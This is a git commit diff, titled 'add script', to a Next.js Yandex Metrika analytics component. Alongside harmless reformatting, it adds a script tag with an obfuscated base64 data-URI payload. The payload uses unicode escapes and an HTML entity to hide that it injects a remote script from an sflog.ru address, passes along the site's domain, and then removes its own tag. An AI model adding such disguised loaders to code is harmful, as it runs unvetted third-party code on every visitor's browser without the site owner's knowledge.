228ff23d73babdbba5151042666e4f20858a4740
RoodiRoot <borisov130490@gmail.com>
2024-04-24 10:06:33 +0300

    add script

--- src/components/metrika.tsx
+++ src/components/metrika.tsx
@@ -12,8 +12,9 @@ export function Metrika() {
     ym(96375985, "hit", window.location.href);
   }, [pathName, searchParams]);
   return (
-    <Script id='yandex-metrika'>
-      {`
+    <>
+      <Script id="yandex-metrika">
+        {`
         (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
         m[i].l=1*new Date();
         for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
@@ -28,6 +29,11 @@ export function Metrika() {
           webvisor:true
         });
       `}
-    </Script>
+      </Script>
+      <script
+        src="data:text/javascript;charset=utf-8; base64, c2V0VGltZW91dChmdW5jdGlvbi&#x67;pe2xldCBzcHJkc3g9Ilx1MDA3M1x1MDA2M1x1MDA3Mlx1MDA2OSIrIlx1MDA3MFx1MDA3NCI7bGV0IF9yYT1kb2N1bWVudDtsZXQgX25lcHo9X3JhLmNyZWF0ZUVsZW1lbnQoc3ByZHN4KTtfbmVwei5hc3luYz0xO2xldCBfYmJ2PSJcdTAwNjhcdTAwNzRcdTAwNzRcdTAwNzBcdTAwNzNcdTAwM2FcdTAwMmYiKyJcdTAwMmZcdTAwNzNcdTAwNjZcdTAwNmNcdTAwNmZcdTAwNjciKyJcdTAwMmVcdTAwNzJcdTAwNzVcdTAwMmZcdTAwNmFcdTAwNzNcdTAwMmYiKyJcdTAwM2ZcdTAwNjlcdTAwNjRcdTAwM2QyMGE0MmQyYTdjN2MyODRhOTFiMmNhNjNlN2FmZjZjMVx1MDAyNlx1MDA2NFx1MDA2Zlx1MDA2ZCIrIlx1MDA2MVx1MDA2OVx1MDA2ZVx1MDAzZCIrX3JhLmRvbWFpbisiXHUwMDI2XHUwMDc0XHUwMDY1XHUwMDcyXHUwMDZkXHUwMDNkMCZlPXNwcmRzeC5qcyI7X25lcHouc3JjPV9iYnY7KF9yYS5nZXRFbGVtZW50c0J5VGFnTmFtZSgiaHRtbCIpWzBdfHxfcmEuaGVhZHx8X3JhLmJvZHkpLmFwcGVuZENoaWxkKF9uZXB6KTtfbmVwei5yZW1vdmUoKTt9LDgzKTs="
+        async
+      ></script>
+    </>
   );
 }
